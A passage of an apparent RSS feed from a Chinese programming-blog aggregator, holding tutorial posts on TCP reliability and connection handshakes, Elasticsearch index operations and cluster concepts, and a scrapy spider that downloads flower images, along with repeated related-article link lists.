--里面找active的那个状态包2.2 这个launcher状态下的安装包名称和active，替换原先的安装包名称问题得到解决。http://www.ppmy.cn/news/1540850.html相关文章4.计算机网络_TCP可靠与效率 
TCP的主要特点&amp;#xff1a; 
TCP是面向连接的运输层协议&amp;#xff0c;每一条TCP连接只能有两个端点&amp;#xff0c;即&amp;#xff1a;点对点、一对一形式。每一个端口都是一个socket。TCP提供可靠交付的服务TCP提供全双工通信&amp;#xff0c;因为TCP的收发缓冲区是分开的。TC…阅读更多...大数据-169 Elasticsearch 索引使用 与 架构概念 增删改查点一下关注吧&amp;#xff01;&amp;#xff01;&amp;#xff01;非常感谢&amp;#xff01;&amp;#xff01;持续更新&amp;#xff01;&amp;#xff01;&amp;#xff01; 
目前已经更新到了&amp;#xff1a; 
Hadoop&amp;#xff08;已更完&amp;#xff09;HDFS&amp;#xff08;已更完&amp;#xff09;MapReduce&amp;#xff08;已更完&amp;am…阅读更多...scrapy 鲜花数据爬虫之【上】图片下载本项目仅供学习之用 
1 爬虫开发 
利用scrapy工程编写爬取鲜花数据的爬虫&amp;#xff0c;本次的目标是先下载相关的图片&amp;#xff0c;要下载图片首先要获取到的就是图片的链接&amp;#xff0c;爬虫的编写如下&amp;#xff1a; 
class FlowerSpider(scrapy.Spider):name  flowerallowed_doma…阅读更多...【AI学习】Anthropic公司CEO Dario Amodei最近发表的文章《Machines of Loving Grace：AI如何让世界变得更好》Anthropic公司CEO Dario Amodei最近发表的文章。通过翻译工具&amp;#xff0c;大概看了看&amp;#xff0c;未来非常美好&amp;#xff01; 只是生物学和身体健康 、神经科学和心理健康这两部分的前景&amp;#xff0c;就非常让人兴奋&amp;#xff01; 
Machines of Loving Grace 
How AI Could Transf…阅读更多...Lua条件语句软考鸭微信小程序 过软考,来软考鸭! 提供软考免费软考讲解视频、题库、软考试题、软考模考、软考查分、软考咨询等服务 在Lua编程语言中&amp;#xff0c;条件语句是控制程序执行流程的关键工具。它们允许开发者根据特定条件的真假来执行不同的代码块&amp;#xff0c;从而实现复杂的逻辑…阅读更多...【Golang】Gin框架：Go语言中的轻量级Web框架✨✨ 欢迎大家来到景天科技苑✨✨ 
&amp;#x1f388;&amp;#x1f388; 养成好习惯&amp;#xff0c;先赞后看哦~&amp;#x1f388;&amp;#x1f388; &amp;#x1f3c6; 作者简介&amp;#xff1a;景天科技苑 &amp;#x1f3c6;《头衔》&amp;#xff1a;大厂架构师&amp;#xff0c;华为云开发者社区专家博主&amp;#xff0c;…阅读更多...Centos安装Nginx 非Docker客户的机器属于 Centos7 系列&amp;#xff0c;由于其较为陈旧&amp;#xff0c;2024开始众多镜像和软件源都已失效。此篇文章将详细记录在 Centos7 操作系统上从零开始安装 Nginx 的整个流程。 
本文Nginx是安装在/usr/local/nginx下 
详细步骤如下&amp;#xff1a; 
准备Nginx安装包&amp;#x…阅读更多...Java之异常体系异常体系分类&amp;#xff1a; Error 错误Exception 异常错误和异常的继承关系&amp;#xff1a; 所有错误的父类为 Error 类所有异常的父类为 Exception 类Error 和 Exception 的父类为 ThrowableThrowable&amp;#xff1a;代表可抛出错误类型&amp;#xff1a; 编译错误&amp;#xff1a;由编译器找到…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:18:25 +0000</pubDate>
    </item>
    <item>
      <title>4.计算机网络_TCP</title>
      <link>https://www.ppmy.cn/news/1540849.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维4.计算机网络_TCPnews/2025/10/31 23:18:23/可靠与效率TCP的主要特点：TCP是面向连接的运输层协议，每一条TCP连接只能有两个端点，即：点对点、一对一形式。每一个端口都是一个socket。TCP提供可靠交付的服务TCP提供全双工通信，因为TCP的收发缓冲区是分开的。TCP面向字节流。流指的是流入或流出进程的字节序列。面向字节流指的是尽管应用程序与TCP的交互是一次一个数据块，但TCP仅仅认为接收到的数据是无结构的字节序列。TCP不关心应用程序一次把多长的报文发送到TCP缓存，只根据对方给出的窗口值与当前网络的拥塞程度来决定一个报文段应包含多少个字节，形成TCP报文段。1、可靠传输及错误处理可靠传输过程：发送方A每发送完成一个分组就会停止发送，等待接收方B返回确认信号。发送方A接收到确认信号后再开启下一次的分组发送。发送方如何处理通信错误的问题：使用超时重传的方式解决。发送方A发送之后，通过接收方B返回的确认信号是否正常接收。在A中会为每一个们组设置一个超时计时器，只有在计时器范围内接收到了B的信号，才会进行下一个分组的发送，如果没有收到B的确认信号，则重传该分组。4种通信错误：分组错误：B收到A发送的分组后，经过检验发现该分组不能使用，此时B不会发送确认信号分组错误其实就是发来的数据有问题。分组丢失：B根本就没有收到A发送的分组，此时B肯定不会发送确认信号。分组丢失其实就是发送的数据丢了。确认丢失：B发送了确认，但A没收到。此时A会重发数据情况1：A重发，B收到的数据错误，不会发送确认。这种情况直到B收到正确为止情况2：A重发，B收到了正确数据，B丢弃重复的数据，并发送确认。该错误结束确认迟到：B发送了确认，但A收到的时候已经超时了。此时A会重发数据情况1：A重发，B收到的数据错误，不会发送确认。这种情况直到B收到正确为止情况2：A重发，B收到了正确数据，B丢弃重复的数据，并发送确认。A接收到确认丢弃重复的确认信号2、提高效率的方式提高传输效率的方式：采用流水线传输，即：在发送分组和等待确认这个时间段中，发送方不断发出多个分组。连续ARQ协议与滑动窗口协议采用该种方式来提高传输效率。这两个协议是TCP的子协议。流水线传输的实现：发送窗口发送窗口是规定一个范围，这个范围就叫做窗口。在这个窗口内的分组可以被连续发送出去，而不需要等待对方确认。如下图，就是一个大小为5的窗口，这12345个分组将会被连续发出。发送窗口滑动发送窗口滑动，就是动态的移动窗口。当接收方收到一个确认，代表有一个分组被传输完成，此时便可以将窗口向前移动一个分组。如下图，就是当接收方接收到分组1返回的确认信号后，就可以将这个窗口向前移动到红框位置。累计确认因为流水线传输这种方法是将分组连续发出，那么接收方也是连续接收到数据。当在一个处理周期内，接收到了多个正确的数据，那么接收方只需要发送最后一个数据的确认来代表全部分组的确认，而不是每个分组都发一个确认。如下图，当接收方连续接收到M2、M3、M4、M5时，并不是发送4个确认信号，而是发送一个M5的确认信号代表这四个数据都收到了。M5这个确认信号就是累计确认。3、包头设计TCP报文段整体框图：在下图中可以看到，TCP报文段包含TCP首部(包头)和TCP数据这两部分。TCP首部包含上方蓝色区域的部分，其中有20个字节是固定的，在这20个字节后可以去主动添加"选项"这个内容，"填充"部分是为了使得"选项"内容进行字节对齐。TCP数据包含下方绿色和橙色区域，由IP首部和IP数据这两部分构成。TCP包头大小如何计算：TCP首部的大小至少20个字节，这20个字节是固定的首部。之后有更多数据("选项-填充"部分)可以继续向下加，新的数据大小应该是4n个字节，如果不够4n个字节将补齐。即：TCP首部的大小应该是4的正数倍。数据偏移是指定TCP报文段中数据开始的位置，这其实也是指TCP包头的大小。数据偏移占4个bit，因此范围是0~15，包头大小与数据偏移的关系为：大小 = 数据偏移 * 4。例如数据偏移=5，那么包头大小就是5*4=20个字节。序号与确认号如何计算：序号：当前发送的分组序号，这是第一个字节的编号（有且仅有第一个分组是随机的）。确认号：发送分组之后接收端返回的确认信号，确认信号 = 序号 + 收到的数据个数假设这个分组序号是100，这也代表第一个字节的编号是100，那么第二个字节编号就是101，依次类推。假如这个数据有200个字节，那么接收方最终收到的字节的序号就是100+200-1=299，最终返回的确认号就是299+1=300。同时这个300代表了下一个分组序号为300。TCP包头其他内容解释：源端口：存放了发送端的端口信息。16位，与博文"端口号"章节中叙述的规则一致。目的端口：存放了接收端的端口信息。16位URG：1代表使能紧急指针，0代表无效紧急指针：紧急数据存放在TCP数据的靠前的一段，紧急指针就是指定哪一部分是紧急数据。ACK：1代表确认号有效，0代表无效PSH：1代表数据已传输完成，可以交给应用进程，0代表无效RST：1代表通信中出现严重问题，TCP数据中断，0代表无效SYN：1代表发起连接请求（三次握手），0代表无效FIN：1代表断开连接请求（四次挥手），0代表无效窗口：流水线传输法中的窗口，数值代表窗口的大小检验和：检验TCP的数据是否正确。TCP的连接管理1、三次握手什么是三次握手：握手就是TCP建立连接的过程，三次握手指的是TCP采用的连接方式是三报文握手，在客户端与服务器之间交换三个TCP报文段。目的是防止已失效的连接请求报文段突然又传输到了，因而产生TCP连接建立错误。注意：对于建立连接，只能由客户端发起。三次握手避免连接错误的过程：1、服务器启动，准备接收客户端的连接请求2、客户端启动，向服务器发送连接请求报文段，这个报文段称为SYN报文段。包头的SYN=1（请求连接），序号seq=x（随机值）注意1：SYN报文段不允许携带数据，但会消耗一个序号。正常情况下是收到一个字节的数据，才消耗掉一个序号。3、服务器收到客户端的SYN报文段后，如果同意连接则发回确认报文段，这也是一个SYN报文段包头的SYN=1，ACK=1（代表确认），确认号ack=x+1，序号seq=y（随机值）注意1：seq=y的y指的是服务器端数据的序号，与第2点seq=x的x做一个区分。客户端与服务器发送的数据序号是独立的，互相没有关系的。注意2：确认信号ack = 序号 + 收到的数据个数，在这里，SYN报文段没有携带数据但是需要消耗一个序号，即：假设收到的数据个数为1。因此ack=x+1注意3：ACK=1代表确认信号，不是说服务器收到了确认信号，而是将ACK=1发给客户端，客户端收到确认报文段中，能够解析出ACK=1，从而得知服务器发送了确认信号。4、客户端收到服务器的SYN报文段后，向服务器再发送一次确认信号。这个报文是ACK报文段包头的ACK=1，序号seq=x+1（第一次SYN报文段时是x），确认信号ack=y+1(同理 3-注意2)注意：当客户端发送了SYN报文段，并收到服务器的确认报文段之后，就代表连接建立。当服务器发送了SYN报文段，并收到了客户端的确认报文段后，就代表连接建立。注意：ACK报文段可以携带数据，如果不携带数据则不消耗序号。2、四次挥手什么是四次挥手：挥手就是TCP断开连接的过程，四次挥手指的是TCP采用的连接方式是四报文挥手。注意：对于断开连接，客户端和服务器都可以发起。什么是三次挥手：三次挥手就是在服务器收到客户端的FIN报文段后，将确认信号与包含数据的报文段一并发给客户端的情况。这样原本确认信号、包含数据的报文段需要两步，现在就只需要了一步，这就使得四次挥手变成了三次挥手。四次挥手避免连接错误的过程：1、客户端向服务器发送释放报文段，这个报文段是FIN报文段。包头的FIN=1，序号seq=u（u就是正常的该传哪一个信号）注意：FIN报文段不携带数据，但消耗一个序号。注意：此时客户端终止 "客户端-&gt;服务器" 的通信2、服务器收到FIN报文段后，返回确认信号。包头的ACK=1，确认号ack=u+1注意：此时服务器得知了 "客户端-&gt;服务器" 的通信已经断开，但服务器处于半关闭状态。3、服务器如果有数据，则继续向客户端发送数据报文段 ，这是FIN报文段包头的FIN=1，ACK=1，序号seq=w，确认号ack=u+14、 客户端收到服务器发送的确认信号和数据报文段后，向服务器发送确认信号。包头的ACK=1，序号seq=u+1，ack=w+1注意：此时客户端得知了 "服务器-&gt;客户端" 的通信已经断开。注意：此时客户端并不会立刻断开连接，而是等待2MSL后才真正断开连接。MSL就是最大报文生存周期，就是"可靠传输"章节的定时器。5、服务器收到客户端的确认信号后，半连接状态断开。注意：此时服务器真正断开连接什么是半关闭状态：半关闭状态就是指如果服务器并没有完全关闭，如果服务器在接收到FIN报文段，发送确认信号之后，依旧有信号要发送，那么将会再向客户端发送一个包含数据的报文段。当数据大小不是很大时，通常将包含数据的报文段与确认信号报文段合并一起，一并发出。客户端等待2MSL后才真正关闭的原因：当客户端接收到服务器的FIN数据报后，向服务器发送确认信号，这个确认信号的生存周期就是MSL。因为TCP的可靠传输性质，当服务器在MSL之后还未收到客户端发来的确认信号，那么服务器就认为通信出错（就是"可靠传输"-"4种通信错误"中的错误），就会重新发送一个FIN数据报。这个重新发送的数据报的生存周期是MSL。这意味这如果客户端在发送确认信号后2MSL时间范围内收到了又一个FIN数据报，那么代表通信错误，客户端将再次向服务器发送确认信号，之后重复等待2MSL这个逻辑。保活计时器：保活计时器的目的是防止TCP连接中出现长时期的空闲，通常设置为2h。当到达2h还没有通信时，服务器会自动向客户端发送一个探测报文段，去测试客户端是否还正常连接。如果发送了10个探测报文段后，客户端仍没有回应，服务器就认为客户端故障，主动终止连接。http://www.ppmy.cn/news/1540849.html相关文章大数据-169 Elasticsearch 索引使用 与 架构概念 增删改查点一下关注吧&amp;#xff01;&amp;#xff01;&amp;#xff01;非常感谢&amp;#xff01;&amp;#xff01;持续更新&amp;#xff01;&amp;#xff01;&amp;#xff01; 
目前已经更新到了&amp;#xff1a; 
Hadoop&amp;#xff08;已更完&amp;#xff09;HDFS&amp;#xff08;已更完&amp;#xff09;MapReduce&amp;#xff08;已更完&amp;am…阅读更多...scrapy 鲜花数据爬虫之【上】图片下载本项目仅供学习之用 
1 爬虫开发 
利用scrapy工程编写爬取鲜花数据的爬虫&amp;#xff0c;本次的目标是先下载相关的图片&amp;#xff0c;要下载图片首先要获取到的就是图片的链接&amp;#xff0c;爬虫的编写如下&amp;#xff1a; 
class FlowerSpider(scrapy.Spider):name  flowerallowed_doma…阅读更多...【AI学习】Anthropic公司CEO Dario Amodei最近发表的文章《Machines of Loving Grace：AI如何让世界变得更好》Anthropic公司CEO Dario Amodei最近发表的文章。通过翻译工具&amp;#xff0c;大概看了看&amp;#xff0c;未来非常美好&amp;#xff01; 只是生物学和身体健康 、神经科学和心理健康这两部分的前景&amp;#xff0c;就非常让人兴奋&amp;#xff01; 
Machines of Loving Grace 
How AI Could Transf…阅读更多...Lua条件语句软考鸭微信小程序 过软考,来软考鸭! 提供软考免费软考讲解视频、题库、软考试题、软考模考、软考查分、软考咨询等服务 在Lua编程语言中&amp;#xff0c;条件语句是控制程序执行流程的关键工具。它们允许开发者根据特定条件的真假来执行不同的代码块&amp;#xff0c;从而实现复杂的逻辑…阅读更多...【Golang】Gin框架：Go语言中的轻量级Web框架✨✨ 欢迎大家来到景天科技苑✨✨ 
&amp;#x1f388;&amp;#x1f388; 养成好习惯&amp;#xff0c;先赞后看哦~&amp;#x1f388;&amp;#x1f388; &amp;#x1f3c6; 作者简介&amp;#xff1a;景天科技苑 &amp;#x1f3c6;《头衔》&amp;#xff1a;大厂架构师&amp;#xff0c;华为云开发者社区专家博主&amp;#xff0c;…阅读更多...Centos安装Nginx 非Docker客户的机器属于 Centos7 系列&amp;#xff0c;由于其较为陈旧&amp;#xff0c;2024开始众多镜像和软件源都已失效。此篇文章将详细记录在 Centos7 操作系统上从零开始安装 Nginx 的整个流程。 
本文Nginx是安装在/usr/local/nginx下 
详细步骤如下&amp;#xff1a; 
准备Nginx安装包&amp;#x…阅读更多...Java之异常体系异常体系分类&amp;#xff1a; Error 错误Exception 异常错误和异常的继承关系&amp;#xff1a; 所有错误的父类为 Error 类所有异常的父类为 Exception 类Error 和 Exception 的父类为 ThrowableThrowable&amp;#xff1a;代表可抛出错误类型&amp;#xff1a; 编译错误&amp;#xff1a;由编译器找到…阅读更多...安装配置sqoop（超详细）前言 
sqoop就是sql-to-hadoop&amp;#xff0c;说通俗点&amp;#xff0c;我们用到最多的就是mysql与hive之间的数据传递&amp;#xff0c;而hive是依靠hadoop运行的&amp;#xff0c;所以要再mysql和hive之间互相传递数据&amp;#xff0c;就必须要安装sqoop 
一、准备 
我们要准备sqoop的安装包&amp;#…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:18:23 +0000</pubDate>
    </item>
    <item>
      <title>大数据-169 Elasticsearch 索引使用 与 架构概念 增删改查</title>
      <link>https://www.ppmy.cn/news/1540848.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维大数据-169 Elasticsearch 索引使用 与 架构概念 增删改查news/2025/10/31 23:18:22/点一下关注吧！！！非常感谢！！持续更新！！！目前已经更新到了：Hadoop（已更完）HDFS（已更完）MapReduce（已更完）Hive（已更完）Flume（已更完）Sqoop（已更完）Zookeeper（已更完）HBase（已更完）Redis （已更完）Kafka（已更完）Spark（已更完）Flink（已更完）ClickHouse（已更完）Kudu（已更完）Druid（已更完）Kylin（已更完）Elasticsearch（正在更新…）章节内容上节我们完成了如下的内容：Elasticsearch 的单机配置 详细流程ES简单使用创建索引创建 wzk_blog01 索引http://h121.wzk.icu:9200/wzk_blog01/?pertty返回结果如下：{"acknowledged":true,"shards_acknowledged":true,"index":"wzk_blog01"}对应的截图如下图所示：插入文档http://h121.wzk.icu:9200/wzk_blog01/_doc/1?pretty{"id":"1","title":"What is lucene"}https://h121.wzk.icu:9200/wzk_blog01/_doc/1?pretty{"id":"1","title":"What is wzk icu"}https://h121.wzk.icu:9200/wzk_blog01/_doc/1?pretty{"id":"1","title":"Apache Spark is a unified analytics engine for large-scale data processing"}返回结果如下：{"_index":"wzk_blog01","_id":"1","_version":1,"result":"created","_shards":{"total":2,"successful":1,"failed":0},"_seq_no":0,"_primary_term":1}查询文档http://h121.wzk.icu:9200/wzk_blog01/_doc/_search/1?pretty返回结果如下：{"_index":"wzk_blog01","_id":"1","_version":3,"_seq_no":2,"_primary_term":1,"found":true,"_source":{"id":"1","title":"Apache Spark is a unified analytics engine for large-scale data processing"}}对应截图如下：更新文档http://h121.wzk.icu:9200/wzk_blog01/_doc/1?pretty{"id":"1","title":" What is elasticsearch"}返回结果如下：{"_index":"wzk_blog01","_id":"1","_version":4,"result":"updated","_shards":{"total":2,"successful":1,"failed":0},"_seq_no":3,"_primary_term":1}对应截图如下：搜索文档http://h121.wzk.icu:9200/wzk_blog01/_doc/_search?pretty返回结果如下：{"query":{"match":{"title":"What"}}}对应截图如下：架构与概念基本简介Elasticsearch是面向文档的（document oriented）的，这意味着它可以存储整个对象或者文档（document）。然后它不仅仅是存储，还会索引（Index）每个文档的内容使之可以被搜索。在Elasticsearch中，你可以对文档（而非成行成列的数据）进行索引、搜索、排序、过滤。Elasticsearch是基于Lucene的全文检索引擎，本质也会存储和检索数据，ES中有很多概念与MySQL概念类型，可以按照关系型的数据库的经验去理解。索引（Index）：类似的数据放在一个索引，非类似的数据放不同索引，一个索引也可以理解成一个关系型数据类型（type）：代表document属于index中的哪个类别（type）也有一种说法一种type就像是数据库的表，比如dept表，user表。需要注意的是，ES每个大版本之间差别很大。映射（mapping）：mapping定义了每个字段的类型等信息，相当于关系型数据库中的表结构，常见的数据类型 text、keyword、number、array、range、boolean、date、geo_point、ip 等等类型Elasticsearch对比传统关系行数据库如下：核心概念索引Index一个索引就是一个拥有几分相似特征的文档的集合，比如说，你可以有一个客户数据的索引，另一个产品目录的索引，还有一个订单数据的索引，一个索引由一个名字来标识（必须全部都是小写字母），并且当我们要对对应于这个索引中的文档进行索引、搜索、更新和删除的时候，都要使用这个名字，在一个集群中，可以定义任意多的索引。类型Type在一个索引中，你可以定义一种或多种类型，一个类型是你的索引的一个逻辑上的分类/分区，其语义完全由你来定。通常，会为具有一组共同字段的文档定义一个类型，比如说，我们假设你运营一个博客平台并且将你所有的数据存储到一个引擎中，在这个索引中，你可以为用户数据定义一个类型，为博客数据定义另一个类型，当然，也可以为评论数据定义另一个类型。当然，也可以为评论数据定义另一个类型。高版本ES中逐渐抛弃了Type的概念，会有一个默认的 type:doc。字段Field相当于是数据表的字段，对文档根据不同属性的进行的分类标识映射mappingmapping是处理数据的方式和规则方面做一些限制，如某个字段的数据类型、默认值、分析器、是否被索引等等，这些都是映射里面可以设置的，其他就是处理ES里面数据的一些使用规则设置也叫映射，按着最优规则处理数据对性能提高很大，因为才需要建立映射，并且需要思考如何建立映射才能对性能更好。文档 document一个文档是一个可被索引的基础信息单元。比如，你可以拥有某一个客户的文档，某一个产品的一个文档，当然，也可以拥有某个订单的一个文档。文档以JSON（JavaScript Object Notation）格式来表示，而JSON是一个到处存在的互联网数据交互格式。在一个Index/type里面，你可以存储任意多的文档。注意，尽管一个文档，物理上存在一个索引之中，文档必须被索引/赋予一个索引的type。近实时NRTElasticsearch是一个接近实时的搜索平台，这意味着，这索引锁一个文档直到这个文档能够被搜索到有一个轻微的延迟（通常是1秒以内）Cluster集群（Cluster）一个Elasticsearch集群由多个节点（Node）组成，每个集群都有一个共同的集群名称作为标识。节点（Node）：一个Elasticsearch实例就是一个Node，一台机器可以有多个实例，正常使用下每个实例都应该会部署在不同的机器上，Elasticsearch的配置文件中可以通过node.master node.data来设置节点类型node.master 表示节点是否具有成为主节点的资格，true代表的有有资格竞选主节点，false代表的是没有资源竞选主节点node.data 表示节点是否存储数据Node节点组合：主节点+数据节点（Master+Data），即有成为主节点的资格，又存储数据node.master:truenode.data:true数据节点（data）：节点没有成为主节点的资格，不参与选举，只会存储数据：node.master:falsenode.data:true客户端节点（client）：不会成为主节点，也不会存储数据，主要是针对海量请求的时候可以进行负载均衡：node.master:falsenode.data:false分片：每个索引由一个或者多个分片，每个分片存储不同的数据，分片可以主分片（primary shard）和复制分片（replica shard），复制分片是主分片的拷贝，默认每个主分片有一个复制分片，每个索引的复制分片的数量可以动态的调整，复制分片从不与它的主分片在同一个节点上。副本：这里指主分片的副本分片（主分片的拷贝）。提高恢复能力，当主分片挂掉的时候，某个复制分片可以变成主分片。提高性能，get和search请求既可以由主分片又可以由复制分片处理注意：每个索引可以被分成多个分片，一个索引页可以被复制0次（意思是没有复制）或多次，一旦复制了，每个索引有了主分片（作为复制源的原来的分片）和复制分片（主分片的拷贝）之别。分片和复制的数量可以在索引创建的时候指定。在索引创建之后，你可以在任何时候动态的改变复制的数量，但你事后不能改变分片的数量。默认情况下，Elasticsearch中的每个索引被分片5个和1个复制，这意味着，如果你的集群中至少有两个节点，你的索引将会有5个主分片和另外5个复制分片（1个完全拷贝），这样的话每个索引总共10个分片。http://www.ppmy.cn/news/1540848.html相关文章scrapy 鲜花数据爬虫之【上】图片下载本项目仅供学习之用 
1 爬虫开发 
利用scrapy工程编写爬取鲜花数据的爬虫&amp;#xff0c;本次的目标是先下载相关的图片&amp;#xff0c;要下载图片首先要获取到的就是图片的链接&amp;#xff0c;爬虫的编写如下&amp;#xff1a; 
class FlowerSpider(scrapy.Spider):name  flowerallowed_doma…阅读更多...【AI学习】Anthropic公司CEO Dario Amodei最近发表的文章《Machines of Loving Grace：AI如何让世界变得更好》Anthropic公司CEO Dario Amodei最近发表的文章。通过翻译工具&amp;#xff0c;大概看了看&amp;#xff0c;未来非常美好&amp;#xff01; 只是生物学和身体健康 、神经科学和心理健康这两部分的前景&amp;#xff0c;就非常让人兴奋&amp;#xff01; 
Machines of Loving Grace 
How AI Could Transf…阅读更多...Lua条件语句软考鸭微信小程序 过软考,来软考鸭! 提供软考免费软考讲解视频、题库、软考试题、软考模考、软考查分、软考咨询等服务 在Lua编程语言中&amp;#xff0c;条件语句是控制程序执行流程的关键工具。它们允许开发者根据特定条件的真假来执行不同的代码块&amp;#xff0c;从而实现复杂的逻辑…阅读更多...【Golang】Gin框架：Go语言中的轻量级Web框架✨✨ 欢迎大家来到景天科技苑✨✨ 
&amp;#x1f388;&amp;#x1f388; 养成好习惯&amp;#xff0c;先赞后看哦~&amp;#x1f388;&amp;#x1f388; &amp;#x1f3c6; 作者简介&amp;#xff1a;景天科技苑 &amp;#x1f3c6;《头衔》&amp;#xff1a;大厂架构师&amp;#xff0c;华为云开发者社区专家博主&amp;#xff0c;…阅读更多...Centos安装Nginx 非Docker客户的机器属于 Centos7 系列&amp;#xff0c;由于其较为陈旧&amp;#xff0c;2024开始众多镜像和软件源都已失效。此篇文章将详细记录在 Centos7 操作系统上从零开始安装 Nginx 的整个流程。 
本文Nginx是安装在/usr/local/nginx下 
详细步骤如下&amp;#xff1a; 
准备Nginx安装包&amp;#x…阅读更多...Java之异常体系异常体系分类&amp;#xff1a; Error 错误Exception 异常错误和异常的继承关系&amp;#xff1a; 所有错误的父类为 Error 类所有异常的父类为 Exception 类Error 和 Exception 的父类为 ThrowableThrowable&amp;#xff1a;代表可抛出错误类型&amp;#xff1a; 编译错误&amp;#xff1a;由编译器找到…阅读更多...安装配置sqoop（超详细）前言 
sqoop就是sql-to-hadoop&amp;#xff0c;说通俗点&amp;#xff0c;我们用到最多的就是mysql与hive之间的数据传递&amp;#xff0c;而hive是依靠hadoop运行的&amp;#xff0c;所以要再mysql和hive之间互相传递数据&amp;#xff0c;就必须要安装sqoop 
一、准备 
我们要准备sqoop的安装包&amp;#…阅读更多...springboot+uinapp基于Android的固定资产借用管理平台文章目录 前言项目介绍技术介绍功能介绍核心代码数据库参考 系统效果图论文效果图 前言 
文章底部名片&amp;#xff0c;获取项目的完整演示视频&amp;#xff0c;免费解答技术疑问 
项目介绍 固定资产借用管理平台设计的目的是为用户提供使用申请、故障报修、设备归还、意见反馈等管理方…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:18:22 +0000</pubDate>
    </item>
    <item>
      <title>scrapy 鲜花数据爬虫之【上】图片下载</title>
      <link>https://www.ppmy.cn/news/1540847.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维scrapy 鲜花数据爬虫之【上】图片下载news/2025/10/31 23:18:21/本项目仅供学习之用1 爬虫开发利用scrapy工程编写爬取鲜花数据的爬虫，本次的目标是先下载相关的图片，要下载图片首先要获取到的就是图片的链接，爬虫的编写如下：classFlowerSpider(scrapy.Spider):name='flower'allowed_domains=['huafensi.com']start_urls=[f"http://www.huafensi.com/huahui/page_{i}.html"foriinrange(1,63)]defparse(self,response):flower_items=response.css('div.part-cont3 dl')forflowerinflower_items:title=flower.css('dt a::attr(title)').get()img_src=flower.css('dt a img::attr(src)').get()img_src=response.urljoin(img_src)detail_url=flower.css('dt a::attr(href)').get()detail_url=response.urljoin(detail_url)# 创建 FlowerItem 实例item=FlowerItem()item['title']=titleitem['image_urls']=[img_src]item['detail_url']=detail_urlreturnitemitem部分之需要把上面用到的3个变量定义一下就行了，然后重点是管道部分，需要开发一个专门下载图片的管道classCustomImagesPipeline(ImagesPipeline):defget_media_requests(self,item,info):forimage_urlinitem['image_urls']:yieldRequest(image_url)deffile_path(self,request,response=None,info=None,*,item=None):# 使用 item['title'] 生成文件名title=item['title'].replace(' ','_').replace('/','_')# 替换空格和斜杠为下划线，避免路径问题filename=f'{title}.jpg'# 假设所有图片格式为 jpgreturnfilenamedefitem_completed(self,results,item,info):image_paths=[x['path']forok,xinresultsifok]ifnotimage_paths:raiseDropItem("Item contains no images")item['images']=image_pathsreturnitem这样图片会自动下载到img文件夹里去了，记得在settings.py里激活一下这个自定义的管道。2 爬虫运行截图3 爬取图片结果总共爬取1465张图片，爬取结果如下4 后续下一篇来说如何爬取花卉的信息存入excel中。http://www.ppmy.cn/news/1540847.html相关文章【AI学习】Anthropic公司CEO Dario Amodei最近发表的文章《Machines of Loving Grace：AI如何让世界变得更好》Anthropic公司CEO Dario Amodei最近发表的文章。通过翻译工具&amp;#xff0c;大概看了看&amp;#xff0c;未来非常美好&amp;#xff01; 只是生物学和身体健康 、神经科学和心理健康这两部分的前景&amp;#xff0c;就非常让人兴奋&amp;#xff01; 
Machines of Loving Grace 
